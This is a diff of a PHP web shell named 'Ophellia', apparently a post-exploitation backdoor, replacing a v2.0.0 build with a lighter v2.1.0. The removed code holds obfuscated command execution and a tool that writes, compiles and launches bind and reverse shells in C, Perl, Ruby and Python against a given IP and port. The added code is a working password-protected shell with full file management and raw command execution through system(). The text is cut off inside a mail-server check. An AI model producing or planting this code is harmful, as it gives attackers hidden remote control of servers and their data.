@@ -1,1012 +1,559 @@
-<?php
-declare (strict_types = 1);
+<?php declare(strict_types=1);
 
-/*
-Ophellia v2.0.0 - 'HoneyComeBear'
-copyright @elliottophellia
+const VERSION = '2.1.0-light';
+const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2';
 
-illegal use is prohibited
-github.com/elliottophellia/ophellia
- */
-
-// Configuration
-const VERSION = '2.0.0-light';
-// you can change theme by simply change version with -theme 
-// eg. VERSION = '2.0.0-dark';
-const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2'; // honeycomebear
-// Use "<?php echo password_hash('your_new_password', PASSWORD_BCRYPT);" to generate a new password hash
-// Or go to https://onlinephp.io/password-hash ($algo = PASSWORD_BCRYPT, $cost = 10)
-
-// Utility functions
-function hexToString(string $hex): string
-{
+function hexToString(string $hex): string {
     return pack('H*', $hex);
 }
 
-function stringToHex(string $string): string
-{
-    return bin2hex($string);
+function stringToHex(string $string): string {
+    return unpack('H*', $string)[1];
 }
 
-function safeFileWrite(string $filename, string $content): bool
-{
-    return file_put_contents($filename, $content) !== false;
+function encryptPath(string $path): string {
+    return stringToHex($path);
 }
 
-function verifyPassword(string $password): bool
-{
-    return password_verify($password, PASSWORD_HASH);
+function decryptPath(string $path): string {
+    return hexToString($path);
 }
 
-function formatFileSize($bytes): string
-{
-    $bytes = (float) $bytes; // Convert to float to handle large values
-    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
-    $bytes = max($bytes, 0);
-    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
-    $pow = min($pow, count($units) - 1);
-    $bytes /= (1 << (10 * $pow));
-    return round($bytes, 2) . ' ' . $units[$pow];
-}
-
-function getLastModified(string $file): string
-{
-    return date("d/m/y-H:i:s", filemtime($file));
-}
-
-function getFilePermissions(string $file): string
-{
-    $perms = fileperms($file);
-    if ($perms === false) {
-        return "<span style='color: #bf616a;'>????</span>"; // Nord red for error
+function authenticate(): bool {
+    if (isset($_POST['password'])) {
+        if (password_verify($_POST['password'], PASSWORD_HASH)) {
+            $_SESSION['authenticated'] = true;
+            return true;
+        }
     }
+    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
+}
 
+function formatSize(int $size): string {
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $i = 0;
+    while ($size >= 1024 && $i < count($units) - 1) {
+        $size /= 1024;
+        $i++;
+    }
+    return round($size, 2) . ' ' . $units[$i];
+}
+
+function getPerms(string $file): string {
+    $perms = fileperms($file);
     $info = '';
-    $info .= (($perms & 0xC000) == 0xC000) ? 's' : ((($perms & 0xA000) == 0xA000) ? 'l' : ((($perms & 0x8000) == 0x8000) ? '-' : 'd'));
+    
+    // Owner
     $info .= (($perms & 0x0100) ? 'r' : '-');
     $info .= (($perms & 0x0080) ? 'w' : '-');
-    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
+    
+    // Group
     $info .= (($perms & 0x0020) ? 'r' : '-');
     $info .= (($perms & 0x0010) ? 'w' : '-');
-    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
+    
+    // World
     $info .= (($perms & 0x0004) ? 'r' : '-');
     $info .= (($perms & 0x0002) ? 'w' : '-');
-    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
-
-    $color = is_writable($file) ? '#a3be8c' : '#bf616a'; // Nord green if writable, Nord red if not
-
-    return "<span style='color: $color;'>$info</span>";
+    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
+    
+    return $info;
 }
 
-function getOwnerGroup(string $item): string
-{
-    $owner = function_exists("posix_getpwuid") ? posix_getpwuid(fileowner($item))['name'] : fileowner($item);
-    $group = function_exists("posix_getgrgid") ? posix_getgrgid(filegroup($item))['name'] : filegroup($item);
-    return "$owner/$group";
+function getCurrentUser(): string {
+    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
+        $user = posix_getpwuid(posix_geteuid());
+        return $user['name'];
+    } elseif (function_exists('exec') && !in_array('exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
+        $user = exec('whoami');
+        return $user;
+    } else {
+        return getenv('USERNAME') ?: getenv('USER');
+    }
 }
 
-function getFileType(string $file): string
-{
-    return mime_content_type($file) ?: filetype($file) ?: 'Unknown';
-}
-
-function getFunctionalCmd(string $cmd): string
-{
-    $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
-    $obfuscated = base64_encode(serialize($funcs));
-    $deobfuscate = function ($x) {return unserialize(base64_decode($x));};
-
-    foreach ($deobfuscate($obfuscated) as $func) {
-        if (function_exists($func)) {
-            return obfuscatedExecution($func, $cmd);
+function breadcrumbPath(string $path): string {
+    $path = rtrim($path, DIRECTORY_SEPARATOR);
+    $isWin = DIRECTORY_SEPARATOR === '\\';
+    $parts = $isWin ? explode('\\', $path) : explode('/', $path);
+    $result = '';
+    
+    $breadcrumb = '';
+    
+    if ($isWin) {
+        if (!empty($parts[0])) {
+            $breadcrumb = $parts[0] . '\\';
+            $result .= '<a href="?cd=' . encryptPath($breadcrumb) . '" class="text-blue-600 hover:underline">' . htmlspecialchars($parts[0]) . '</a>\\';
         }
+        $pathSoFar = $parts[0] . '\\';
+        for ($i = 1; $i < count($parts); $i++) {
+            if (!empty($parts[$i])) {
+                $pathSoFar .= $parts[$i] . '\\';
+                $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="text-blue-600 hover:underline">' . htmlspecialchars($parts[$i]) . '</a>\\';
+            }
+        }
+        $result = rtrim($result, '\\');
+    } else {
+        $result = '<a href="?cd=' . encryptPath('/') . '" class="text-blue-600 hover:underline">/</a>';
+        $pathSoFar = '/';
+        for ($i = 0; $i < count($parts); $i++) {
+            if (!empty($parts[$i])) {
+                $pathSoFar .= $parts[$i] . '/';
+                $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="text-blue-600 hover:underline">' . htmlspecialchars($parts[$i]) . '</a>/';
+            }
+        }
+        $result = rtrim($result, '/');
     }
-
-    return "No available function to execute command.";
+    
+    return $result;
 }
 
-function obfuscatedExecution(string $func, string $cmd): string
-{
-    $encoded = base64_encode($cmd);
-    $decoded = base64_decode($encoded);
+function fileManager(string $dir): void {
+    $files = array_diff(scandir($dir), ['.', '..']);
+    
+    echo '<div class="w-full overflow-x-auto">';
+    echo '<table class="w-full table-auto border-collapse">';
+    echo '<thead><tr class="bg-gray-200">';
+    echo '<th class="border px-4 py-2 text-left">Name</th>';
+    echo '<th class="border px-4 py-2 text-left">Size</th>';
+    echo '<th class="border px-4 py-2 text-left">Permissions</th>';
+    echo '<th class="border px-4 py-2 text-left">Last Modified</th>';
+    echo '<th class="border px-4 py-2 text-left">Actions</th>';
+    echo '</tr></thead><tbody>';
+    
+    // Parent directory link
+    echo '<tr class="hover:bg-gray-100">';
+    echo '<td class="border px-4 py-2"><a href="?cd=' . encryptPath(dirname($dir)) . '" class="text-blue-600 hover:underline">..</a></td>';
+    echo '<td class="border px-4 py-2">-</td>';
+    echo '<td class="border px-4 py-2">-</td>';
+    echo '<td class="border px-4 py-2">-</td>';
+    echo '<td class="border px-4 py-2">-</td>';
+    echo '</tr>';
+    
+    foreach ($files as $file) {
+        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
+        $isDir = is_dir($fullPath);
+        
+        echo '<tr class="hover:bg-gray-100">';
+        echo '<td class="border px-4 py-2">';
+        
+        if ($isDir) {
+            echo '<a href="?cd=' . encryptPath($fullPath) . '" class="text-blue-600 hover:underline">' . htmlspecialchars($file) . '</a>';
+        } else {
+            echo '<a href="?action=view&file=' . encryptPath($fullPath) . '" class="text-blue-600 hover:underline">' . htmlspecialchars($file) . '</a>';
+        }
+        
+        echo '</td>';
+        echo '<td class="border px-4 py-2">' . ($isDir ? '-' : formatSize(filesize($fullPath))) . '</td>';
+        echo '<td class="border px-4 py-2">' . getPerms($fullPath) . '</td>';
+        echo '<td class="border px-4 py-2">' . date("Y-m-d H:i:s", filemtime($fullPath)) . '</td>';
+        echo '<td class="border px-4 py-2 space-x-2">';
+        
+        if (!$isDir) {
+            echo '<a href="?download=' . encryptPath($fullPath) . '" class="text-green-600 hover:underline">Download</a> ';
+            echo '<a href="?action=edit&file=' . encryptPath($fullPath) . '" class="text-blue-600 hover:underline">Edit</a> ';
+        }
+        
+        echo '<a href="?action=rename&file=' . encryptPath($fullPath) . '" class="text-yellow-600 hover:underline">Rename</a> ';
+        echo '<a href="?action=chmod&file=' . encryptPath($fullPath) . '" class="text-purple-600 hover:underline">Chmod</a>';
+        echo '</td></tr>';
+    }
+    
+    echo '</tbody></table></div>';
+}
 
-    switch ($func) {
-        case 'shell_exec':
-        case 'exec':
-            return call_user_func($func, $decoded);
-        case 'system':
-        case 'passthru':
-            ob_start();
-            call_user_func($func, $decoded);
-            return ob_get_clean();
-        case 'proc_open':
-            return executeWithProc_open($decoded);
-        case 'popen':
-            return executeWithPopen($decoded);
-        default:
-            return "Unknown function: $func";
+function viewFile(string $file): void {
+    $content = htmlspecialchars(file_get_contents($file));
+    
+    echo '<div class="container mx-auto p-4">';
+    echo '<h2 class="text-xl font-bold mb-4">Viewing: ' . htmlspecialchars(basename($file)) . '</h2>';
+    
+    // File info section
+    echo '<div class="mb-4 p-2 bg-gray-100 rounded">';
+    echo '<p><strong>Path:</strong> ' . htmlspecialchars($file) . '</p>';
+    echo '<p><strong>Size:</strong> ' . formatSize(filesize($file)) . '</p>';
+    echo '<p><strong>Permissions:</strong> ' . getPerms($file) . '</p>';
+    echo '<p><strong>Last Modified:</strong> ' . date("Y-m-d H:i:s", filemtime($file)) . '</p>';
+    echo '</div>';
+    
+    // File content
+    echo '<div class="mb-4">';
+    echo '<pre class="bg-gray-800 text-gray-100 p-4 rounded overflow-auto max-h-96">' . $content . '</pre>';
+    echo '</div>';
+    
+    // Actions
+    echo '<div class="flex space-x-2">';
+    echo '<a href="?action=edit&file=' . encryptPath($file) . '" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Edit</a>';
+    echo '<a href="?download=' . encryptPath($file) . '" class="px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600">Download</a>';
+    echo '<a href="?cd=' . encryptPath(dirname($file)) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Back</a>';
+    echo '</div>';
+    
+    echo '</div>';
+}
+
+function downloadFile(string $file): void {
+    if (file_exists($file)) {
+        $filename = basename($file);
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.$filename.'"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        flush(); // Flush system output buffer
+        readfile($file);
+        exit;
     }
 }
 
-function executeWithProc_open(string $cmd): string
-{
-    $spec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
-    $proc = call_user_func('proc_open', $cmd, $spec, $pipes);
-    if (is_resource($proc)) {
-        fclose($pipes[0]);
-        $out = stream_get_contents($pipes[1]);
-        $err = stream_get_contents($pipes[2]);
-        array_map('fclose', array_slice($pipes, 1));
-        proc_close($proc);
-        return $err ? "Error: $err" : $out;
+function editFile(string $file): void {
+    $dirname = dirname($file);
+    
+    // Store original action and file parameters
+    $action = isset($_GET['action']) ? $_GET['action'] : '';
+    $fileParam = isset($_GET['file']) ? $_GET['file'] : '';
+    
+    // Process the form submission
+    if (isset($_POST['content'])) {
+        file_put_contents($file, $_POST['content']);
+        // Instead of redirecting, just reset the POST data
+        $_POST = array();
+        // Display file manager instead of edit form
+        echo '<div class="bg-green-100 border-l-4 border-green-500 text-green-700 p-4 mb-4" role="alert">
+            <p>File saved successfully!</p>
+        </div>';
+        fileManager($dirname);
+        return;
     }
-    return "Failed to execute command using proc_open.";
+    
+    // Show edit form
+    $content = htmlspecialchars(file_get_contents($file));
+    
+    echo '<div class="container mx-auto p-4">';
+    echo '<h2 class="text-xl font-bold mb-4">Editing: ' . htmlspecialchars(basename($file)) . '</h2>';
+    echo '<form method="post">';
+    echo '<textarea name="content" rows="20" class="w-full p-2 border border-gray-300 rounded mb-4">' . $content . '</textarea>';
+    echo '<div class="flex space-x-2">';
+    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Save</button>';
+    echo '<a href="?cd=' . encryptPath($dirname) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Cancel</a>';
+    echo '</div>';
+    echo '</form>';
+    echo '</div>';
 }
 
-function executeWithPopen(string $cmd): string
-{
-    $handle = call_user_func('popen', $cmd, 'r');
-    if ($handle) {
-        $output = stream_get_contents($handle);
-        pclose($handle);
-        return $output;
-    }
-    return "Failed to execute command using popen.";
-}
-
-class Elliottophellia
-{
-    private string $currentPath;
-    private array $get;
-    private array $post;
-    private array $files;
-    private string $selfFile;
-
-    public function __construct(array $get, array $post, array $files)
-    {
-        $this->get = $get;
-        $this->post = $post;
-        $this->files = $files;
-        $this->currentPath = hexToString($this->get['d'] ?? stringToHex(getcwd()));
-        $this->selfFile = $_SERVER['PHP_SELF'];
-        chdir($this->currentPath);
-    }
-
-    public function run(): void
-    {
-        if (!$this->isAuthenticated()) {
-            $this->showLoginForm();
+function newFile(string $dir): void {
+    if (isset($_POST['filename']) && isset($_POST['content'])) {
+        if (empty($_POST['filename'])) {
+            echo '<div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-4" role="alert">
+                <p>Error: File name cannot be empty!</p>
+            </div>';
+            // Show the form again
+            displayNewFileForm($dir);
             return;
         }
-
-        $this->showHeader();
-
-        if (isset($this->get['t'])) {
-            $tool = hexToString($this->get['t']);
-            switch ($tool) {
-                case 'network':
-                    $this->showNetworkTools();
-                    break;
-                case 'mailer':
-                    $this->showMailerTools();
-                    break;
-                case 'upload':
-                    $this->showUploadTools();
-                    break;
-                case 'info':
-                    $this->showSystemInfo();
-                    break;
-                case 'mkfile':
-                    $this->showFileCreationTools();
-                    break;
-                case 'mkdir':
-                    $this->showDirectoryCreationTools();
-                    break;
-                case 'command':
-                    $this->showCommandExecutionTools();
-                    break;
-                case 'cname':
-                    $this->showRenameFileTools();
-                    break;
-                case 'fedit':
-                    $this->showFileEditTools();
-                    break;
-                case 'fview':
-                    $this->showFileViewTools();
-                    break;
-                case 'download':
-                    $this->downloadFile(hexToString($this->get['f']));
-                    break;
-                default:
-                    $this->showFileManager();
-                    break;
-            }
-        } else {
-            $this->showFileManager();
-        }
-
-        $this->handleFileOperations();
-        $this->showFooter();
+        
+        $filename = $dir . DIRECTORY_SEPARATOR . $_POST['filename'];
+        file_put_contents($filename, $_POST['content']);
+        
+        // Reset POST data and show file manager
+        $_POST = array();
+        echo '<div class="bg-green-100 border-l-4 border-green-500 text-green-700 p-4 mb-4" role="alert">
+            <p>File created successfully!</p>
+        </div>';
+        fileManager($dir);
+        return;
     }
+    
+    displayNewFileForm($dir);
+}
 
-    private function isAuthenticated(): bool
-    {
-        if (isset($this->post['pass'])) {
-            if (verifyPassword($this->post['pass'])) {
-                $_SESSION['authenticated'] = true;
-            }
+function displayNewFileForm(string $dir): void {
+    echo '<div class="container mx-auto p-4">';
+    echo '<h2 class="text-xl font-bold mb-4">Create New File in: ' . htmlspecialchars($dir) . '</h2>';
+    echo '<form method="post">';
+    echo '<div class="mb-4">';
+    echo '<label class="block text-gray-700">Filename:</label>';
+    echo '<input type="text" name="filename" class="w-full p-2 border border-gray-300 rounded" required>';
+    echo '</div>';
+    echo '<div class="mb-4">';
+    echo '<label class="block text-gray-700">Content:</label>';
+    echo '<textarea name="content" rows="15" class="w-full p-2 border border-gray-300 rounded"></textarea>';
+    echo '</div>';
+    echo '<div class="flex space-x-2">';
+    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Create</button>';
+    echo '<a href="?cd=' . encryptPath($dir) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Cancel</a>';
+    echo '</div>';
+    echo '</form>';
+    echo '</div>';
+}
+
+function newFolder(string $dir): void {
+    if (isset($_POST['foldername'])) {
+        if (empty($_POST['foldername'])) {
+            echo '<div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-4" role="alert">
+                <p>Error: Folder name cannot be empty!</p>
+            </div>';
+            // Show the form again
+            displayNewFolderForm($dir);
+            return;
         }
-
-        return $_SESSION['authenticated'] ?? false;
+        
+        $foldername = $dir . DIRECTORY_SEPARATOR . $_POST['foldername'];
+        mkdir($foldername, 0755);
+        
+        // Reset POST data and show file manager
+        $_POST = array();
+        echo '<div class="bg-green-100 border-l-4 border-green-500 text-green-700 p-4 mb-4" role="alert">
+            <p>Folder created successfully!</p>
+        </div>';
+        fileManager($dir);
+        return;
     }
+    
+    displayNewFolderForm($dir);
+}
 
-    private function showLoginForm(): void
-    {
-        echo '<!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <meta name="robots" content="noindex, nofollow" />
-            <title>WELCOME!</title>
-            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v'.VERSION.'.css">
-            <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
-        </head>
-        <body>
-            <div class="login-container">
-                <h1>WELCOME BACK!</h1>
-                <form action="" method="post">
-                    <input type="password" name="pass" placeholder="Password" required>
-                    <button type="submit">Login</button>
-                </form>
-            </div>
-        </body>
-        </html>';
+function displayNewFolderForm(string $dir): void {
+    echo '<div class="container mx-auto p-4">';
+    echo '<h2 class="text-xl font-bold mb-4">Create New Folder in: ' . htmlspecialchars($dir) . '</h2>';
+    echo '<form method="post">';
+    echo '<div class="mb-4">';
+    echo '<label class="block text-gray-700">Folder Name:</label>';
+    echo '<input type="text" name="foldername" class="w-full p-2 border border-gray-300 rounded" required>';
+    echo '</div>';
+    echo '<div class="flex space-x-2">';
+    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Create</button>';
+    echo '<a href="?cd=' . encryptPath($dir) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Cancel</a>';
+    echo '</div>';
+    echo '</form>';
+    echo '</div>';
+}
+
+function commandLine(string $dir): void {
+    $output = '';
+    if (isset($_POST['command'])) {
+        $command = $_POST['command'];
+        chdir($dir);
+        
+        ob_start();
+        system($command . " 2>&1", $return_var);
+        $output = ob_get_clean();
     }
-
-    private function showHeader(): void
-    {
-        echo '<!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>OPHELLIA v' . VERSION . '</title>
-            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v'.VERSION.'.css">
-            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-            <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
-        </head>
-        <body>
-            <header>
-                <h1 class="title">ELLIOTTOPHELLIA</h1>
-                <p class="uname">' . php_uname('a') . '</p>
-            </header>
-
-        <nav class="mobile-nav">
-            <button class="hamburger" aria-label="Menu">☰ MENU</button>
-            <ul class="nav-menu">
-              <li><a href="' . $this->selfFile . '"><i class="fas fa-home"></i> Home</a></li>
-              <li><a href="' . $this->selfFile . '?t=' . stringToHex('upload') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-upload"></i> Upload</a></li>
-              <li><a href="' . $this->selfFile . '?t=' . stringToHex('network') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-network-wired"></i> Network</a></li>
-              <li><a href="' . $this->selfFile . '?t=' . stringToHex('mailer') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-envelope"></i> Mailer</a></li>
-              <li><a href="' . $this->selfFile . '?t=' . stringToHex('info') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-info-circle"></i> Info</a></li>
-              <li><a href="' . $this->selfFile . '?exit"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
-          </ul>
-        </nav>
-
-            <main>';
+    
+    echo '<div class="container mx-auto p-4">';
+    echo '<h2 class="text-xl font-bold mb-4">Command Line in: ' . htmlspecialchars($dir) . '</h2>';
+    echo '<form method="post">';
+    echo '<div class="mb-4">';
+    echo '<label class="block text-gray-700">Command:</label>';
+    echo '<input type="text" name="command" class="w-full p-2 border border-gray-300 rounded">';
+    echo '</div>';
+    echo '<div class="mb-4">';
+    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Execute</button>';
+    echo '</div>';
+    echo '</form>';
+    
+    if (!empty($output)) {
+        echo '<div class="mt-4">';
+        echo '<h3 class="text-lg font-bold mb-2">Output:</h3>';
+        echo '<pre class="bg-black text-green-500 p-4 rounded overflow-auto max-h-96">' . htmlspecialchars($output) . '</pre>';
+        echo '</div>';
     }
+    echo '</div>';
+}
 
-    private function handleFileOperations(): void
-    {
-        if (isset($this->get['rfile']) && is_writable(hexToString($this->get['rfile']))) {
-            $this->removeFile(hexToString($this->get['rfile']));
-        }
-
-        if (isset($this->get['rmdir']) && is_writable(hexToString($this->get['rmdir']))) {
-            $this->removeDirectory(hexToString($this->get['rmdir']));
-        }
-
-        if (isset($this->get['exit'])) {
-            $this->exit();
-        }
+function renameFile(string $file): void {
+    $dirname = dirname($file);
+    
+    if (isset($_POST['newname'])) {
+        $newname = $dirname . DIRECTORY_SEPARATOR . $_POST['newname'];
+        rename($file, $newname);
+        
+        // Reset POST data and show file manager
+        $_POST = array();
+        echo '<div class="bg-green-100 border-l-4 border-green-500 text-green-700 p-4 mb-4" role="alert">
+            <p>File renamed successfully!</p>
+        </div>';
+        fileManager($dirname);
+        return;
     }
+    
+    echo '<div class="container mx-auto p-4">';
+    echo '<h2 class="text-xl font-bold mb-4">Rename: ' . htmlspecialchars(basename($file)) . '</h2>';
+    echo '<form method="post">';
+    echo '<div class="mb-4">';
+    echo '<label class="block text-gray-700">New Name:</label>';
+    echo '<input type="text" name="newname" value="' . htmlspecialchars(basename($file)) . '" class="w-full p-2 border border-gray-300 rounded">';
+    echo '</div>';
+    echo '<div class="flex space-x-2">';
+    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Rename</button>';
+    echo '<a href="?cd=' . encryptPath($dirname) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Cancel</a>';
+    echo '</div>';
+    echo '</form>';
+    echo '</div>';
+}
 
-    private function removeFile(string $file): void
-    {
-        if (unlink($file)) {
-            echo "<dialog id='successModal' class='modal success'>
-            <p>File $file Deleted Successfully!</p>
-            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-          </dialog>";
-            echo "<script>document.getElementById('successModal').showModal();</script>";
-        } else {
-            echo "<dialog id='errorModal' class='modal error'>
-            <p>Failed to delete file $file.</p>
-            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-          </dialog>";
-            echo "<script>document.getElementById('errorModal').showModal();</script>";
-        }
+function chmodFile(string $file): void {
+    $dirname = dirname($file);
+    
+    if (isset($_POST['permission'])) {
+        $permission = octdec($_POST['permission']);
+        chmod($file, $permission);
+        
+        // Reset POST data and show file manager
+        $_POST = array();
+        echo '<div class="bg-green-100 border-l-4 border-green-500 text-green-700 p-4 mb-4" role="alert">
+            <p>Permissions changed successfully!</p>
+        </div>';
+        fileManager($dirname);
+        return;
     }
-
-    private function removeDirectory(string $dir): void
-    {
-        if (rmdir($dir)) {
-            echo "<dialog id='successModal' class='modal success'>
-            <p>Directory $dir Deleted Successfully!</p>
-            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-          </dialog>";
-            echo "<script>document.getElementById('successModal').showModal();</script>";
-        } else {
-            echo "<dialog id='errorModal' class='modal error'>
-            <p>Failed to delete directory.</p>
-            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-          </dialog>";
-            echo "<script>document.getElementById('errorModal').showModal();</script>";
-        }
-    }
-
-    private function createFile(string $fileName, string $fileContent = ''): void
-    {
-        $fullPath = $this->currentPath . '/' . $fileName;
-
-        if (file_put_contents($fullPath, $fileContent) !== false) {
-            echo "<dialog id='successModal' class='modal success'>
-                <p>File '$fileName' Created Successfully!</p>
-                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-              </dialog>";
-            echo "<script>document.getElementById('successModal').showModal();</script>";
-        } else {
-            echo "<dialog id='errorModal' class='modal error'>
-                <p>Failed to create file '$fileName'.</p>
-                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?t=" . stringToHex('mkfile') . "&d=" . stringToHex($this->currentPath) . "';'>Close</button>
-              </dialog>";
-            echo "<script>document.getElementById('errorModal').showModal();</script>";
-        }
-    }
-
-    private function createDirectory(string $dir): void
-    {
-        if (mkdir($this->currentPath . "/" . $dir, 0777, true)) {
-            echo "<dialog id='successModal' class='modal success'>
-                <p>Directory $dir Created Successfully!</p>
-                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-              </dialog>";
-            echo "<script>document.getElementById('successModal').showModal();</script>";
-        } else {
-            echo "<dialog id='errorModal' class='modal error'>
-                <p>Failed to create directory $dir.</p>
-                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-              </dialog>";
-            echo "<script>document.getElementById('errorModal').showModal();</script>";
-        }
-    }
-
-    private function exit(): void
-    {
-        session_destroy();
-        echo '<script>window.location.href = "' . $this->selfFile . '";</script>';
-    }
-
-    private function downloadFile(string $file): void
-    {
-        if (file_exists($file)) {
-            header('Content-Description: File Transfer');
-            header('Content-Type: application/octet-stream');
-            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
-            header('Expires: 0');
-            header('Cache-Control: must-revalidate');
-            header('Pragma: public');
-            header('Content-Length: ' . filesize($file));
-            readfile($file);
-            exit;
-        }
-    }
-
-    private function executeNetworkTool(string $type, string $ip, string $port, string $pty, string $rby, string $bcc, string $bcp, string $bpc, string $bpp): void
-    {
-        switch ($type) {
-            case 'cb':
-                safeFileWrite('/tmp/cb.c', $bpc);
-                getFunctionalCmd('gcc -o /tmp/cb /tmp/cb.c');
-                getFunctionalCmd('/tmp/cb ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep cb') . "</pre>";
-                break;
-            case 'pb':
-                safeFileWrite('/tmp/pb.pl', $bpp);
-                getFunctionalCmd('perl /tmp/pb.pl ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep pb') . "</pre>";
-                break;
-            case 'cbc':
-                safeFileWrite('/tmp/cbc.c', $bcc);
-                getFunctionalCmd('gcc -o /tmp/cbc /tmp/cbc.c');
-                getFunctionalCmd('/tmp/cbc ' . $ip . ' ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep cbc') . "</pre>";
-                break;
-            case 'pbc':
-                safeFileWrite('/tmp/pbc.pl', $bcp);
-                getFunctionalCmd('perl /tmp/pbc.pl ' . $ip . ' ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep pbc') . "</pre>";
-                break;
-            case 'rbb':
-                safeFileWrite('/tmp/rbb.rb', $rby);
-                getFunctionalCmd('ruby /tmp/rbb.rb ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep rbb') . "</pre>";
-                break;
-            case 'rbbc':
-                safeFileWrite('/tmp/rbbc.rb', $rby);
-                getFunctionalCmd('ruby /tmp/rbbc.rb ' . $port . ' ' . $ip . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep rbbc') . "</pre>";
-                break;
-            case 'pyb':
-                safeFileWrite('/tmp/pyb.py', $pty);
-                getFunctionalCmd('python /tmp/pyb.py ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep pyb') . "</pre>";
-                break;
-            case 'pybc':
-                safeFileWrite('/tmp/pybc.py', $pty);
-                getFunctionalCmd('python /tmp/pybc.py ' . $port . ' ' . $ip . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep pybc') . "</pre>";
-                break;
-        }
-    }
-
-    private function checkMailServerAccess(): bool
-    {
-        $testTo = 'test@example.com';
-        $testSubject = 'Test Mail Server Access';
-        $testMessage = 'This is a test message to check mail server access.';
-        $testHeaders = 'From: test@' . $_SERVER['SERVER_NAME'] . "\r\n" . 'X-Mailer: PHP/' . phpversion();
-
-        // Suppress warnings and notices during the mail() function call
-        $errorReporting = error_reporting();
